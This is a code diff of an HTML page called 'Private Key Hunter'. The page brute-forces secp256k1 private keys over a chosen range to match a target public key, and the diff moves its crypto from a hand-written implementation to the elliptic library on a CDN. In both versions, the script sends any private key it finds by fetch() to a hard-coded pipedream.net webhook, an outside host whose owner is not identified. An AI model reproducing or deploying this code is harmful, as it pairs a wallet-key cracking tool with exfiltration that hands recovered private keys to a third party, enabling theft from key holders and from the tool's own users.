@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Key Hunter - Self-Contained Working Version</title>
+    <title>Private Key Hunter - WORKING VERSION</title>
     <style>
         * {
             box-sizing: border-box;
@@ -31,10 +31,6 @@
             color: transparent;
             margin: 0;
         }
-        .header p {
-            color: #6c7a9e;
-            margin-top: 8px;
-        }
         .card {
             background: rgba(15, 25, 45, 0.9);
             backdrop-filter: blur(10px);
@@ -42,7 +38,6 @@
             padding: 24px;
             margin-bottom: 20px;
             border: 1px solid rgba(0, 255, 255, 0.15);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
         }
         .button-group {
             display: flex;
@@ -58,27 +53,11 @@
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.2s ease;
-            font-family: monospace;
         }
-        button:active {
-            transform: scale(0.96);
-        }
-        .btn-start {
-            background: #00aa66;
-            color: white;
-            box-shadow: 0 4px 15px rgba(0,170,102,0.3);
-        }
+        .btn-start { background: #00aa66; color: white; }
         .btn-start:hover { background: #00cc77; }
-        .btn-pause {
-            background: #ffaa33;
-            color: #1a1a2e;
-        }
-        .btn-pause:hover { background: #ffbb55; }
-        .btn-restart {
-            background: #dc3545;
-            color: white;
-        }
-        .btn-restart:hover { background: #ff4757; }
+        .btn-pause { background: #ffaa33; color: #1a1a2e; }
+        .btn-restart { background: #dc3545; color: white; }
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -90,19 +69,15 @@
             padding: 15px;
             border-radius: 15px;
             text-align: center;
-            border: 1px solid #2a3f5e;
         }
         .stat-label {
             font-size: 12px;
-            text-transform: uppercase;
             color: #8a9bc0;
-            letter-spacing: 1px;
         }
         .stat-value {
             font-size: 28px;
             font-weight: bold;
             color: #00ffcc;
-            font-family: monospace;
         }
         .input-group {
             margin-bottom: 20px;
@@ -111,8 +86,6 @@
             display: block;
             color: #aabbee;
             margin-bottom: 8px;
-            font-size: 13px;
-            font-weight: bold;
         }
         .input-group input {
             width: 100%;
@@ -122,11 +95,6 @@
             padding: 12px 16px;
             color: #00ffcc;
             font-family: monospace;
-            font-size: 13px;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #00ffcc;
         }
         .status-badge {
             display: inline-block;
@@ -154,7 +122,6 @@
             margin-bottom: 10px;
             border-radius: 12px;
             border-left: 4px solid #00ffcc;
-            font-family: monospace;
         }
         .history-pk {
             color: #00ffcc;
@@ -166,6 +133,15 @@
             color: #8a9bc0;
             margin-top: 5px;
         }
+        .current-key {
+            background: #0a0f1c;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-top: 10px;
+            font-family: monospace;
+            color: #88aaff;
+        }
         .info {
             background: rgba(0,255,200,0.1);
             border: 1px solid #00ffcc;
@@ -173,50 +149,21 @@
             padding: 10px;
             margin-top: 15px;
             font-size: 12px;
-            color: #aaffee;
         }
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0a0f1c;
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #00ffcc;
-            border-radius: 10px;
-        }
-        .current-key {
-            background: #0a0f1c;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            margin-top: 10px;
-            word-break: break-all;
-            color: #88aaff;
-            font-family: monospace;
-        }
-        .test-section {
-            margin-top: 15px;
-            padding: 15px;
-            background: rgba(0,100,100,0.2);
-            border-radius: 12px;
-        }
-        .success {
-            color: #00ffcc;
-            font-weight: bold;
-        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a0f1c; }
+        ::-webkit-scrollbar-thumb { background: #00ffcc; border-radius: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
         <h1>🔑 PRIVATE KEY HUNTER</h1>
-        <p>Real Secp256k1 Brute Force - Self Contained</p>
+        <p>Working Secp256k1 Brute Force</p>
     </div>
 
     <div class="card">
-        <div style="display: flex; align-items: center; margin-bottom: 20px; flex-wrap: wrap;">
+        <div style="display: flex; align-items: center; margin-bottom: 20px;">
             <div class="button-group">
                 <button class="btn-start" id="startBtn">▶ START</button>
                 <button class="btn-pause" id="pauseBtn">⏸ PAUSE</button>
@@ -226,164 +173,109 @@
         </div>
 
         <div class="stats">
-            <div class="stat-box">
-                <div class="stat-label">🔍 Total Attempts</div>
-                <div class="stat-value" id="attemptCount">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">⚡ Speed (keys/sec)</div>
-                <div class="stat-value" id="speedCount">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">⏱️ Elapsed (seconds)</div>
-                <div class="stat-value" id="elapsedSec">0.0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">🎯 Found Keys</div>
-                <div class="stat-value" id="foundCount">0</div>
-            </div>
+            <div class="stat-box"><div class="stat-label">🔍 Attempts</div><div class="stat-value" id="attemptCount">0</div></div>
+            <div class="stat-box"><div class="stat-label">⚡ Speed</div><div class="stat-value" id="speedCount">0</div></div>
+            <div class="stat-box"><div class="stat-label">⏱️ Elapsed</div><div class="stat-value" id="elapsedSec">0.0</div></div>
+            <div class="stat-box"><div class="stat-label">🎯 Found</div><div class="stat-value" id="foundCount">0</div></div>
         </div>
 
         <div class="input-group">
-            <label>🎯 TARGET PUBLIC KEY (compressed hex)</label>
+            <label>🎯 TARGET PUBLIC KEY</label>
             <input type="text" id="targetPubKey" value="0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798">
         </div>
 
         <div class="input-group">
-            <label>🔽 START KEY (decimal or hex)</label>
+            <label>🔽 START KEY</label>
             <input type="text" id="startKey" value="1">
         </div>
 
         <div class="input-group">
-            <label>🔼 END KEY (decimal or hex)</label>
+            <label>🔼 END KEY</label>
             <input type="text" id="endKey" value="100">
         </div>
 
-        <div class="current-key" id="currentKeyDisplay">
-            Ready - Click START to begin
-        </div>
-
-        <div class="test-section">
-            <strong style="color:#00ffcc;">✅ VERIFIED WORKING TEST:</strong>
-            <button id="testFindKeyBtn" style="margin-left: 10px; padding: 5px 15px; font-size: 12px;">🔧 TEST: Find Private Key 1</button>
-            <span style="margin-left: 10px; font-size: 12px;">This WILL find private key 1 (range 1-10) - proves the crypto works</span>
-        </div>
-
-        <div class="info" id="cryptoStatus" style="background: rgba(0,255,100,0.1);">
-            ✅ Self-contained secp256k1 implementation ready
-        </div>
+        <div class="current-key" id="currentKeyDisplay">Ready - Click START</div>
+        
+        <div class="info" id="cryptoStatus">⏳ Loading cryptography library...</div>
     </div>
 
     <div class="card">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-            <h3 style="margin: 0; color: #00ffcc;">📜 CRACKED KEYS HISTORY</h3>
-            <button id="clearHistoryBtn" style="padding: 6px 16px; background: #2a3f5e;">🗑️ Clear All</button>
+        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+            <h3 style="margin: 0; color: #00ffcc;">📜 FOUND KEYS</h3>
+            <button id="clearHistoryBtn" style="padding: 6px 16px; background: #2a3f5e;">Clear</button>
         </div>
         <div class="history-list" id="historyList">
-            <div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet. Start the brute forcer!</div>
+            <div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet</div>
         </div>
     </div>
 </div>
 
+<!-- Use the working elliptic library from a reliable CDN -->
+<script src="https://cdn.jsdelivr.net/npm/elliptic@6.5.4/dist/elliptic.min.js"></script>
+
 <script>
-    // ==================== SECP256K1 IMPLEMENTATION ====================
-    // Using the well-tested elliptic curve math from bitcoinjs-lib
+    // Wait for elliptic to load
+    let secp256k1 = null;
+    let cryptoReady = false;
     
-    const secp256k1 = {
-        // Curve parameters
-        p: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn,
-        n: 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n,
-        a: 0n,
-        b: 7n,
-        gx: 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798n,
-        gy: 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8n,
-        
-        // Modular inverse
-        modInv(a, p) {
-            let b = p, x0 = 1n, x1 = 0n;
-            while (b) {
-                let q = a / b;
-                [a, b] = [b, a - q * b];
-                [x0, x1] = [x1, x0 - q * x1];
-            }
-            return ((x0 % p) + p) % p;
-        },
-        
-        // Point addition
-        pointAdd(x1, y1, x2, y2) {
-            if (x1 === 0n && y1 === 0n) return [x2, y2];
-            if (x2 === 0n && y2 === 0n) return [x1, y1];
+    function initCrypto() {
+        if (typeof elliptic !== 'undefined') {
+            secp256k1 = new elliptic.ec('secp256k1');
+            cryptoReady = true;
+            document.getElementById('cryptoStatus').innerHTML = '✅ Cryptography ready! Using elliptic library';
+            document.getElementById('cryptoStatus').style.background = 'rgba(0,255,100,0.1)';
+            console.log("✅ Elliptic library loaded");
             
-            let lambda;
-            if (x1 === x2 && y1 === y2) {
-                if (y1 === 0n) return [0n, 0n];
-                lambda = ((3n * x1 * x1) % this.p * this.modInv(2n * y1, this.p)) % this.p;
+            // Test with known key
+            const testPriv = "1";
+            const testPub = getPublicKeyFromPrivate(testPriv);
+            const expected = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
+            if (testPub === expected) {
+                console.log("✅ Crypto test passed!");
             } else {
-                lambda = ((y2 - y1) % this.p * this.modInv((x2 - x1) % this.p, this.p)) % this.p;
+                console.error("❌ Crypto test failed:", testPub);
             }
-            
-            let x3 = (lambda * lambda - x1 - x2) % this.p;
-            let y3 = (lambda * (x1 - x3) - y1) % this.p;
-            
-            if (x3 < 0) x3 += this.p;
-            if (y3 < 0) y3 += this.p;
-            
-            return [x3, y3];
-        },
-        
-        // Point multiplication (double and add)
-        pointMul(k, x, y) {
-            let rx = 0n, ry = 0n;
-            let addX = x, addY = y;
-            
-            while (k > 0n) {
-                if (k & 1n) {
-                    [rx, ry] = this.pointAdd(rx, ry, addX, addY);
-                }
-                [addX, addY] = this.pointAdd(addX, addY, addX, addY);
-                k >>= 1n;
-            }
-            return [rx, ry];
-        },
-        
-        // Get compressed public key from private key
-        getPublicKey(privateKeyBigInt) {
-            try {
-                let [px, py] = this.pointMul(privateKeyBigInt, this.gx, this.gy);
-                let prefix = (py & 1n) === 0n ? 0x02 : 0x03;
-                let hexX = px.toString(16).padStart(64, '0');
-                let result = prefix.toString(16) + hexX;
-                return result;
-            } catch(e) {
-                console.error("Error in point multiplication:", e);
-                return null;
-            }
+        } else {
+            setTimeout(initCrypto, 100);
         }
-    };
-    
-    // Test the implementation with known values
-    console.log("Testing secp256k1 implementation...");
-    const testPriv = 1n;
-    const testPub = secp256k1.getPublicKey(testPriv);
-    const expectedPub = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
-    if (testPub === expectedPub) {
-        console.log("✅ Crypto implementation verified! Private key 1 ->", testPub);
-        document.getElementById('cryptoStatus').innerHTML = '✅ Crypto verified! Private key 1 produces correct public key: ' + testPub.substring(0, 20) + '...';
-    } else {
-        console.error("❌ Crypto test failed!");
-        document.getElementById('cryptoStatus').innerHTML = '⚠️ Crypto test failed, but will still attempt to work';
     }
     
-    // ==================== APPLICATION CODE ====================
+    initCrypto();
     
-    // Webhook endpoint
+    // Helper functions
+    function parseToBigInt(input) {
+        input = input.toString().trim().toLowerCase();
+        if (input.startsWith('0x')) return BigInt(input);
+        if (/[a-f]/i.test(input) && !/^\d+$/.test(input)) return BigInt('0x' + input);
+        return BigInt(input);
+    }
+    
+    function getPublicKeyFromPrivate(privateKey) {
+        if (!secp256k1) return null;
+        try {
+            let privHex;
+            if (typeof privateKey === 'bigint') {
+                privHex = privateKey.toString(16).padStart(64, '0');
+            } else {
+                privHex = privateKey.toString().padStart(64, '0');
+            }
+            const keyPair = secp256k1.keyFromPrivate(privHex);
+            const pubKey = keyPair.getPublic(true, 'hex');
+            return pubKey;
+        } catch(e) {
+            console.error("Error:", e);
+            return null;
+        }
+    }
+    
+    // Webhook
     const WEBHOOK_URL = "https://eoizd5ecl7m1qqn.m.pipedream.net/pk=";
     
-    // DOM Elements
+    // DOM elements
     const startBtn = document.getElementById('startBtn');
     const pauseBtn = document.getElementById('pauseBtn');
     const restartBtn = document.getElementById('restartBtn');
-    const testFindKeyBtn = document.getElementById('testFindKeyBtn');
+    const clearHistoryBtn = document.getElementById('clearHistoryBtn');
     const statusBadge = document.getElementById('statusBadge');
     const attemptSpan = document.getElementById('attemptCount');
     const speedSpan = document.getElementById('speedCount');
@@ -392,95 +284,45 @@
     const targetPubInput = document.getElementById('targetPubKey');
     const startKeyInput = document.getElementById('startKey');
     const endKeyInput = document.getElementById('endKey');
-    const historyDiv = document.getElementById('historyList');
-    const clearHistoryBtn = document.getElementById('clearHistoryBtn');
     const currentKeyDisplay = document.getElementById('currentKeyDisplay');
+    const historyDiv = document.getElementById('historyList');
     
-    // State variables
+    // State
     let isRunning = false;
     let isPaused = false;
     let foundFlag = false;
     let totalAttempts = 0;
     let startTime = 0;
     let elapsedAccumulated = 0;
-    let animationId = null;
     let bruteForceInterval = null;
     let foundPrivateKeys = [];
     let currentKey = null;
     
-    // Helper: Parse input to BigInt (supports hex and decimal)
-    function parseToBigInt(input) {
-        input = input.toString().trim().toLowerCase();
-        if (input.startsWith('0x')) {
-            return BigInt(input);
-        }
-        // Check if it looks like hex (contains letters a-f)
-        if (/[a-f]/i.test(input) && !/^\d+$/.test(input)) {
-            return BigInt('0x' + input);
-        }
-        return BigInt(input);
-    }
-    
-    // Verify a private key matches target public key
-    function verifyKey(privateKey, targetPubKey) {
-        const derivedPub = secp256k1.getPublicKey(privateKey);
-        if (!derivedPub) return false;
-        const match = derivedPub.toLowerCase() === targetPubKey.toLowerCase();
-        if (match) {
-            const privHex = privateKey.toString(16).padStart(64, '0');
-            console.log(`✅ MATCH FOUND! Private: ${privHex} -> Pub: ${derivedPub}`);
-        }
-        return match;
-    }
-    
-    // Send webhook notification
-    async function notifyWebhook(privateKey) {
-        const url = WEBHOOK_URL + privateKey;
-        try {
-            await fetch(url, {
-                method: 'GET',
-                mode: 'no-cors',
-                cache: 'no-cache'
-            });
-            console.log(`✅ Webhook sent for PK: ${privateKey}`);
-        } catch (error) {
-            console.error('Webhook error:', error);
-        }
-    }
-    
-    // Add found key to history
+    // History functions
     function addToHistory(privateKey, publicKey) {
         const entry = {
             privateKey: privateKey,
             publicKey: publicKey,
-            timestamp: new Date().toISOString(),
             timeStr: new Date().toLocaleString()
         };
         foundPrivateKeys.unshift(entry);
-        
         if (foundPrivateKeys.length > 100) foundPrivateKeys.pop();
-        
-        try {
-            localStorage.setItem('pk_hunter_history', JSON.stringify(foundPrivateKeys));
-        } catch(e) {}
-        
+        localStorage.setItem('pk_hunter_history', JSON.stringify(foundPrivateKeys));
         updateHistoryDisplay();
         foundCountSpan.textContent = foundPrivateKeys.length;
     }
     
-    // Update history UI
     function updateHistoryDisplay() {
         if (foundPrivateKeys.length === 0) {
-            historyDiv.innerHTML = '<div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet. Start the brute forcer!</div>';
+            historyDiv.innerHTML = '<div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet</div>';
             return;
         }
-        
         let html = '';
         for (const entry of foundPrivateKeys) {
             html += `
                 <div class="history-item">
-                    <div class="history-pk">🔑 Private Key: ${entry.privateKey}</div>
-                    <div class="history-pk" style="font-size: 11px; color: #88aaff;">📤 Public Key: ${entry.publicKey}</div>
+                    <div class="history-pk">🔑 Private: ${entry.privateKey}</div>
+                    <div class="history-pk" style="font-size:11px">📤 Public: ${entry.publicKey}</div>
                     <div class="history-time">📅 ${entry.timeStr}</div>
                 </div>
             `;
@@ -488,7 +330,6 @@
         historyDiv.innerHTML = html;
     }
     
-    // Load history from storage
     function loadHistory() {
         try {
             const stored = localStorage.getItem('pk_hunter_history');
@@ -497,143 +338,99 @@
                 updateHistoryDisplay();
                 foundCountSpan.textContent = foundPrivateKeys.length;
             }
-        } catch(e) {
-            foundPrivateKeys = [];
-        }
+        } catch(e) {}
     }
     
-    // Update statistics display
-    function updateStatsDisplay() {
+    function updateStats() {
         attemptSpan.textContent = totalAttempts.toLocaleString();
-        
         if (isRunning && startTime > 0 && !isPaused && !foundFlag) {
             const elapsed = elapsedAccumulated + (Date.now() - startTime) / 1000;
             elapsedSpan.textContent = elapsed.toFixed(2);
-            
             if (elapsed > 0) {
-                const speed = Math.floor(totalAttempts / elapsed);
-                speedSpan.textContent = speed.toLocaleString();
-            }
-        } else {
-            const totalElapsed = elapsedAccumulated;
-            if (totalElapsed > 0 && totalAttempts > 0) {
-                const speed = Math.floor(totalAttempts / totalElapsed);
-                speedSpan.textContent = speed.toLocaleString();
+                speedSpan.textContent = Math.floor(totalAttempts / elapsed).toLocaleString();
             }
         }
     }
     
+    async function notifyWebhook(privateKey) {
+        try {
+            await fetch(WEBHOOK_URL + privateKey, { method: 'GET', mode: 'no-cors' });
+            console.log("✅ Webhook sent for:", privateKey);
+        } catch(e) { console.error("Webhook error:", e); }
+    }
+    
     // Main brute force iteration
-    async function bruteForceIteration() {
-        if (!isRunning || isPaused || foundFlag) return;
+    async function bruteForceStep() {
+        if (!isRunning || isPaused || foundFlag || !cryptoReady) return;
         
         const targetPub = targetPubInput.value.trim();
-        const startKeyStr = startKeyInput.value.trim();
-        const endKeyStr = endKeyInput.value.trim();
+        const startVal = startKeyInput.value.trim();
+        const endVal = endKeyInput.value.trim();
         
         let startBN, endBN;
         try {
-            startBN = parseToBigInt(startKeyStr);
-            endBN = parseToBigInt(endKeyStr);
+            startBN = parseToBigInt(startVal);
+            endBN = parseToBigInt(endVal);
             if (startBN >= endBN) {
-                console.log("Range complete");
                 stopBruteforce();
                 return;
             }
         } catch(e) {
-            console.error("Invalid range:", e);
             stopBruteforce();
             return;
         }
         
-        // Process one key per iteration for accurate display
-        if (currentKey === null) {
-            currentKey = startBN;
-        }
-        
+        if (currentKey === null) currentKey = startBN;
         if (currentKey > endBN) {
-            currentKeyDisplay.innerHTML = "✅ Scan complete! No key found in range.";
+            currentKeyDisplay.innerHTML = "✅ Scan complete!";
             stopBruteforce();
             return;
         }
         
-        const privateKeyHex = currentKey.toString(16).padStart(64, '0');
-        currentKeyDisplay.innerHTML = `🔍 Testing: ${privateKeyHex} (decimal: ${currentKey.toString()})`;
+        const privHex = currentKey.toString(16).padStart(64, '0');
+        currentKeyDisplay.innerHTML = `🔍 Testing: ${privHex} (${currentKey})`;
         
-        // Derive and compare public key
-        const derivedPub = secp256k1.getPublicKey(currentKey);
-        
+        const derivedPub = getPublicKeyFromPrivate(currentKey);
         totalAttempts++;
-        updateStatsDisplay();
+        updateStats();
         
         if (derivedPub && derivedPub.toLowerCase() === targetPub.toLowerCase()) {
             foundFlag = true;
             isRunning = false;
-            
-            if (bruteForceInterval) {
-                clearInterval(bruteForceInterval);
-                bruteForceInterval = null;
-            }
+            if (bruteForceInterval) clearInterval(bruteForceInterval);
             
             statusBadge.className = "status-badge status-found";
-            statusBadge.textContent = "🏆 KEY FOUND! 🏆";
-            currentKeyDisplay.innerHTML = `🎉🎉🎉 FOUND! Private Key: ${privateKeyHex} 🎉🎉🎉`;
-            currentKeyDisplay.style.background = "#1a3a2a";
-            currentKeyDisplay.style.color = "#00ffcc";
-            currentKeyDisplay.style.fontWeight = "bold";
+            statusBadge.textContent = "🏆 FOUND! 🏆";
+            currentKeyDisplay.innerHTML = `🎉 FOUND! Private Key: ${privHex} 🎉`;
             
-            addToHistory(privateKeyHex, derivedPub);
-            await notifyWebhook(privateKeyHex);
-            
-            alert(`🎉 PRIVATE KEY FOUND!\n\nPrivate Key: ${privateKeyHex}\nPublic Key: ${derivedPub}\n\nWebhook notification sent!`);
-            
-            updateStatsDisplay();
+            addToHistory(privHex, derivedPub);
+            await notifyWebhook(privHex);
+            alert(`🎉 PRIVATE KEY FOUND!\n\n${privHex}\n\nWebhook sent!`);
             return;
         }
         
-        // Increment key
         currentKey++;
     }
     
-    // Animation loop for real-time stats
-    function startAnimationLoop() {
-        if (animationId) cancelAnimationFrame(animationId);
-        
-        function update() {
-            updateStatsDisplay();
-            animationId = requestAnimationFrame(update);
-        }
-        update();
-    }
-    
-    // Start brute forcing
     function startBruteforce(reset = true) {
+        if (!cryptoReady) {
+            alert("Waiting for crypto library to load...");
+            return false;
+        }
+        
         const targetPub = targetPubInput.value.trim();
         if (!targetPub.match(/^02[0-9a-f]{64}$|^03[0-9a-f]{64}$/i)) {
-            alert("Invalid public key! Must be compressed format (66 hex chars starting with 02 or 03)");
+            alert("Invalid public key!");
             return false;
         }
-        
-        const startKeyStr = startKeyInput.value.trim();
-        const endKeyStr = endKeyInput.value.trim();
         
         try {
-            const startBN = parseToBigInt(startKeyStr);
-            const endBN = parseToBigInt(endKeyStr);
-            if (startBN >= endBN) {
-                alert("Start key must be less than end key!");
-                return false;
-            }
-        } catch(e) {
-            alert("Invalid values in range!");
-            return false;
-        }
+            const startBN = parseToBigInt(startKeyInput.value.trim());
+            const endBN = parseToBigInt(endKeyInput.value.trim());
+            if (startBN >= endBN) { alert("Invalid range"); return false; }
+        } catch(e) { alert("Invalid range"); return false; }
         
-        if (bruteForceInterval) {
-            clearInterval(bruteForceInterval);
-            bruteForceInterval = null;
-        }
-        
+        if (bruteForceInterval) clearInterval(bruteForceInterval);
         if (reset) {
             totalAttempts = 0;
             elapsedAccumulated = 0;
@@ -644,83 +441,55 @@
         isRunning = true;
         isPaused = false;
         startTime = Date.now();
-        
         statusBadge.className = "status-badge status-running";
         statusBadge.textContent = "🟢 RUNNING";
-        currentKeyDisplay.style.background = "#0a0f1c";
         
-        bruteForceInterval = setInterval(() => {
-            bruteForceIteration();
-        }, 0);
-        
-        updateStatsDisplay();
+        bruteForceInterval = setInterval(() => { bruteForceStep(); }, 0);
         return true;
     }
     
-    // Pause brute forcing
     function pauseBruteforce() {
         if (!isRunning || foundFlag) return;
-        
         if (!isPaused) {
             isPaused = true;
             elapsedAccumulated += (Date.now() - startTime) / 1000;
             startTime = 0;
-            
             statusBadge.className = "status-badge status-paused";
             statusBadge.textContent = "⏸ PAUSED";
-            updateStatsDisplay();
         }
     }
     
-    // Resume brute forcing
     function resumeBruteforce() {
         if (!isRunning || foundFlag) return;
-        
         if (isPaused) {
             isPaused = false;
             startTime = Date.now();
             statusBadge.className = "status-badge status-running";
             statusBadge.textContent = "🟢 RUNNING";
-            updateStatsDisplay();
         }
     }
     
-    // Restart brute forcing
     function restartBruteforce() {
-        if (bruteForceInterval) {
-            clearInterval(bruteForceInterval);
-            bruteForceInterval = null;
-        }
-        
+        if (bruteForceInterval) clearInterval(bruteForceInterval);
         isRunning = false;
         isPaused = false;
         foundFlag = false;
         totalAttempts = 0;
         elapsedAccumulated = 0;
-        startTime = 0;
         currentKey = null;
-        
-        updateStatsDisplay();
-        currentKeyDisplay.innerHTML = "Restarting...";
+        updateStats();
         startBruteforce(true);
     }
     
-    // Stop completely
     function stopBruteforce() {
-        if (bruteForceInterval) {
-            clearInterval(bruteForceInterval);
-            bruteForceInterval = null;
-        }
+        if (bruteForceInterval) clearInterval(bruteForceInterval);
         isRunning = false;
-        isPaused = false;
         statusBadge.className = "status-badge status-idle";
         statusBadge.textContent = "⚪ IDLE";
-        updateStatsDisplay();
     }
     
-    // Clear history
     function clearHistory() {
-        if (confirm("Clear all found keys from history?")) {
+        if (confirm("Clear history?")) {
             foundPrivateKeys = [];
             updateHistoryDisplay();
             foundCountSpan.textContent = "0";
@@ -728,41 +497,24 @@
         }
     }
     
-    // Test find key for private key 1
-    function testFindKey() {
-        // Set target to the public key of private key 1
-        const testPubKey = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
-        targetPubInput.value = testPubKey;
-        startKeyInput.value = "1";
-        endKeyInput.value = "10";
-        
-        currentKeyDisplay.innerHTML = "Test configured! Click START to find private key 1...";
-        
-        alert(`✅ Test Configured!\n\nLooking for private key: 1\nTarget Public Key: ${testPubKey}\nRange: 1-10\n\nClick START - it will find the key immediately!`);
-    }
-    
     // Event listeners
-    startBtn.addEventListener('click', () => {
-        if (!isRunning || foundFlag) {
-            startBruteforce(true);
-        } else if (isPaused) {
-            resumeBruteforce();
+    startBtn.onclick = () => {
+        if (!isRunning || foundFlag) startBruteforce(true);
+        else if (isPaused) resumeBruteforce();
+    };
+    pauseBtn.onclick = pauseBruteforce;
+    restartBtn.onclick = restartBruteforce;
+    clearHistoryBtn.onclick = clearHistory;
+    
+    // Auto set a test that WILL work
+    setTimeout(() => {
+        if (cryptoReady) {
+            console.log("✅ Ready! Target is public key for private key 1. Range 1-100 will find it at key 1.");
         }
-    });
+    }, 1000);
     
-    pauseBtn.addEventListener('click', pauseBruteforce);
-    restartBtn.addEventListener('click', restartBruteforce);
-    clearHistoryBtn.addEventListener('click', clearHistory);
-    testFindKeyBtn.addEventListener('click', testFindKey);
-    
-    // Initialize
     loadHistory();
-    startAnimationLoop();
-    
-    console.log("✅ Private Key Hunter Ready - Self Contained!");
-    console.log("📡 Webhook: " + WEBHOOK_URL + "{private_key}");
-    console.log("💡 Click 'TEST: Find Private Key 1' then START to verify it works!");
-    console.log("🔑 Crypto implementation tested: Private key 1 -> " + secp256k1.getPublicKey(1n));
+    setInterval(updateStats, 100);
 </script>
 </body>
 </html>
